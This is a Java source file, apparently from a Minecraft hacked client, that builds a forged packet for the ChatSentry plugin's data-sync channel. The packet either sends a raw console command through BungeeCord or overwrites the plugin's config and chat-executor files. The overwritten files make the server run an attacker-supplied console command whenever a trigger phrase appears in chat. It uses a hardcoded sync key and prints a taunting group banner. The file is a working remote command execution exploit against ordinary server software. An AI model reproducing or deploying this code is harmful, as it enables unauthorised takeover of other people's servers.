package io.github.spigotrce.paradiseclientprivate.packets;

import com.google.common.io.ByteArrayDataOutput;
import com.google.common.io.ByteStreams;
import io.github.spigotrce.paradiseclientfabric.Helper;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.codec.PacketCodec;
import net.minecraft.network.packet.CustomPayload;
import net.minecraft.util.Identifier;

import java.io.ByteArrayOutputStream;
import java.util.Objects;

public record ChatSentryPayloadPacket(String command, boolean isBungee, String type) implements CustomPayload {
    public static final PacketCodec<PacketByteBuf, ChatSentryPayloadPacket> CODEC = CustomPayload.codecOf(ChatSentryPayloadPacket::write, ChatSentryPayloadPacket::new);
    public static final Id<ChatSentryPayloadPacket> ID = new Id<>(Identifier.of("chatsentry", "datasync"));

    private ChatSentryPayloadPacket(PacketByteBuf buf) {
        this(buf.readString(), buf.readBoolean(), buf.readString());
    }

    public ChatSentryPayloadPacket(String command, boolean isBungee, String type) {
        this.command = command;
        this.isBungee = isBungee;
        this.type = type;
    }

    private void write(PacketByteBuf buf) {
        final ByteArrayDataOutput out = ByteStreams.newDataOutput();
        if (isBungee) {
            out.writeUTF("console_command");
            out.writeUTF(command);
            buf.writeBytes(out.toByteArray());
        } else {
            if (Objects.equals(type, "config")) {
                out.writeUTF("sync");
                out.writeUTF("");
                out.writeUTF("skibidi");
                out.writeUTF("config.yml");
                out.writeUTF("""
                         check-for-updates: false
                         
                         # Where should ChatSentry's modules filter?
                         process-chat: true
                         process-commands: true
                         
                         # Should ChatSentry's applicable modules filter through writing on signs, renaming items in anvils, and writing in books?
                         # Currently the modules directly supporting these options are the Word & Phrase Filter, Link & Ad Blocker, and the Unicode Remover
                         process-signs: true
                         process-anvils: true
                         process-books: true
                         
                         # Context prediction aims to increase positive detections and decrease false positive detections through acting as a safenet for supported modules with logic that dynamically adjusts thresholds and settings real-time to react more precisely based on predicted context of messages. Adjustments are temporary and bound to specific messages only.
                         context-prediction: true
                         
                         # Should ChatSentry disable Minecraft's built in "Kicked for spamming" / "disconnect.spam" kick?
                         # It's recommended to keep this enabled to give the auto punisher full punishment priority. If you don't plan to use the auto punisher, you may want to turn this off
                         disable-vanilla-spam-kick: true
                         
                         # Experimental: Using BungeeCord or Velocity? ChatSentry offers various cross-server synchronization options below.
                         # For information on how to set up the plugin to work with BungeeCord or Velocity, see the guide here: https://wiki.chatsentry.xyz/network-bridge-setup-guide
                         # The below settings are global and non-exclusive to this instance. Any changes made here will be applied to all other ChatSentry configs on your network.
                         network:
                         enable: false
                         sync-configs: true
                         global-admin-notifier-messages: true
                         
                         
                         # --------------------------------------------------------------------------------------
                         #                                     Modules
                         # --------------------------------------------------------------------------------------
                         
                         # Below you can enable the modules you'd like to use. Go in to the modules individual config files to adjust their settings
                         
                         
                         # Admin Notifier
                         # Notifies admins real-time when a module is triggered with detailed information, allowing them to know when to take action if necessary.
                         enable-admin-notifier: false
                         
                         
                         # Discord Notifier
                         # Sends Discord notifications via webhooks when modules flag a message or action, players are manually or automatically warned, warnings are pardoned, autowarns expire, and when the Auto Punisher punishes a player
                         enable-discord-notifier: false
                         
                         
                         # Intelligent Auto Punisher
                         # Automatically runs punishment commands on players who excessively trigger modules within a defined time frame.
                         enable-auto-punisher: false
                         
                         
                         # Intelligent Word & Phrase Filter
                         # Hyper intelligently detects swears configured blocked words or phrases (and words/phrases similar to those on the list) from being said in chat, commands, signs, anvils, and books (additional check contexts can be disabled).
                         enable-word-and-phrase-filter: false
                         
                         
                         # Intelligent Link & Ad Blocker
                         # Prevents web links & server advertising (regular server ips & numeric server ips) with optional extra sensitivity bypass detection in chat, commands, signs, anvils, and books (additional check contexts can be disabled). Includes the ability to whitelist domains or all subdomains of a domain.
                         enable-link-and-ad-blocker: false
                         
                         
                         # Intelligent Spam Blocker
                         # Accurately blocks spammy messages by examining their word, character, and sequence diversity in comparison to the messages length. Additionally prevents players from repeating the same or similar messages over and over within a short period of time with a dynamically adjusting repeat cooldown
                         enable-spam-blocker: false
                         
                         
                         # Intelligent Chat Cooldown
                         # Controls how quickly players can send messages and configured or all commands within a defined time frame.
                         enable-chat-cooldown: false
                         
                         
                         # Intelligent Anti Chat Flood
                         # Prevents or intelligently modifies the use of excessive repeated characters and very long "words" without interfering with players using 'expressive' chat.
                         enable-anti-chat-flood: false
                         
                         
                         # Unicode Remover
                         # Removes non US-ASCII (US keyboard) characters in chat messages and commands to prevent alphanumeric lookalike unicode characters from being used to bypass filters & modules. Has the option to use a compatibility mode that only blocks unicode used by hacked clients - blocking virtually all alphanumeric lookalike unicode supported by MC while allowing other languages in chat, commands, signs, anvils, and books (additional check contexts can be disabled)
                         enable-unicode-remover: false
                         
                         
                         # Intelligent Cap Limiter
                         # Limits the use of excessive capital letters in messages without interference of messages using proper grammar. Can auto-set the message to lowercase or blocks it entirely. Player names are ignored.
                         enable-cap-limiter: false
                         
                         
                         # Intelligent Anti Parrot
                         # Prevents players using hacked clients to automatically copy ("parrot") other players chat messages. Also prevents the same (non-generic) message from be said by multiple players within a short time frame. Able to detect bots/players appending random sequences of numbers and other characters to their messages to try and evade the filter.
                         enable-anti-parrot: false
                         
                         
                         # Intelligent Chat Executor
                         # Modifies and or performs actions triggered by defined messages/commands using simple or complex matching techniques. Optionally supports execution of sign text and anvil renames.
                         enable-chat-executor: true
                         
                         
                         # Anti Statue Spambot
                         # Prevents joining players abilities to send messages or commands until they move in order to protect against basic artificially controlled spam bots. Has an optional command whitelist.
                         # Does not require "process-commands" in the main config to be enabled to function.
                         enable-anti-statue-spambot: false
                         
                         
                         # Anti Relog Spam
                         # Prevents players excessively relogging in short periods of time to flood chat. Uses a dynamically increasing cooldown to effectively combat excessive relogging without affecting players who are relogging reasonably.
                         enable-anti-relog-spam: false
                         
                         
                         # Anti Join Flood
                         # Prevents more than a defined amount of players joining every minute to prevent bot join flooding to lag, spam, & or crash the server.
                         enable-anti-join-flood: false
                         
                         
                         # Anti Command Prefix
                         # Prevents players using prefixed commands to get around filters and discover potential sensitive server information like the plugins. Ex. /minecraft:me instead of /me. Optionally integrates with the Command Spy module; when a command is modified/a prefix is removed, it will appear crossed out in the command spy notification.
                         # Does not require "process-commands" in the main config to be enabled to function.
                         enable-anti-command-prefix: false
                         
                         
                         # Auto Grammar
                         # Converts players' messages to use proper capitalization, periods, and correct typos in chat and configured or all commands.
                         enable-auto-grammar: false
                         
                         
                         # Command Spy
                         # Shows players real-time commands to admins. Commands can optionally be whitelisted or blacklisted.
                         # Does not require "process-commands" in the main config to be enabled to function.
                         enable-command-spy: false
                         
                         
                         # --------------------------------------------------------------------------------------
                         #                                      Logging
                         # --------------------------------------------------------------------------------------
                         
                         # Should messages flagged by modules be logged for future reference?
                         # This is required to be enabled in order to make use of the lookup command
                         enable-violations-log: true
                         
                         # Below is which module triggers will be logged. Disregarded if the above option is not enabled
                         enable-logging-for:
                         chat-cooldown: false
                         link-and-ad-blocker: true
                         word-and-phrase-filter: true
                         spam-blocker: true
                         unicode-remover: true
                         cap-limiter: true
                         anti-parrot: true
                         anti-chat-flood: true
                         anti-statue-spambot: false
                         chat-executor: false
                         
                         # The plugin will periodically attempt to erase log data older than the below value in days in effort to save database space
                         # NOTE: a full server restart is required for changes to this option to take effect
                         # Set to -1 to disable automatic cleaning
                         clean-logs-older-than: 30
                         
                         
                         # --------------------------------------------------------------------------------------
                         #                                 Permission Overrides
                         # --------------------------------------------------------------------------------------
                         
                         # You can disable the functionality of particular module/restrictions' bypass permissions and force modules to apply themselves to players even with bypass permissions or op by enabling the overrides below
                         # It's recommended you do this per-player/group with permissions by simply negating/disabling the bypass permission for modules/restrictions you'd like to apply to them if they have the bypass all permission
                         # This option is mainly useful for testing purposes if you don't want to have to deop yourself for testing
                         override-bypass-permissions:
                         chat-cooldown: false
                         link-and-ad-blocker: false
                         word-and-phrase-filter: false
                         spam-blocker: false
                         unicode-remover: false
                         cap-limiter: false
                         anti-parrot: false
                         anti-chat-flood: false
                         anti-statue-spambot: false
                         anti-join-flood: false
                         chat-executor: true
                         auto-grammar: false
                         anti-command-prefix: false
                         command-spy: false
                         
                         
                         # --------------------------------------------------------------------------------------
                         #                                  Server Lockdown
                         # --------------------------------------------------------------------------------------
                         
                         # You can use /cslockdown to toggle a persistent through server restart lock on the server which can either block unseen before/unknown players from joining, or everybody except those who are on the below exemption list
                         # This command was designed to be used under the case of a bot attack to disallow the unseen before player-bots entering the server, but it can be used for other purposes as well
                         # Kick messages can be found in lang.yml
                         
                         lockdown:
                         active: false
                         # Valid modes: 'only-known', 'only-exempt'
                         current-mode: "only-known"
                         exempt-usernames:
                           - "Notch"
                           - "jeb_"
                         
                         
                         # --------------------------------------------------------------------------------------
                         #                                  Chat toggle
                         # --------------------------------------------------------------------------------------
                         
                         # Inaccessible commands when /togglechat is enabled
                         command-blacklist:
                         - "/tell"
                         - "/t"
                         - "/msg"
                         - "/w"
                         - "/r"
                         - "/whisper"
                         - "/w"
                         - "/pm"
                         - "/me"
                         """);
            } else {
                out.writeUTF("sync");
                out.writeUTF("modules");
                out.writeUTF("skibidi");
                out.writeUTF("chat-executor.yml");
                out.writeUTF("""
                         entries:
                           1:
                             match: "{regex}(SpigotRCEOnTop|LunaSQxSpigotRCExAutismINC)"
                             set-matches-as: "{block}"
                             execute:
                               - "{console_cmd}: REPLACETHECOMMAND"
                               - "{player_msg}: &a&lLunaSQ x SpigotRCE x AutismINC on top!"
                         """.replaceAll("REPLACETHECOMMAND", command));
            }
            out.writeUTF("2822111278697");
            buf.writeBytes(out.toByteArray());
        }
    }

    public CustomPayload.Id<ChatSentryPayloadPacket> getId() {
        return ID;
    }
}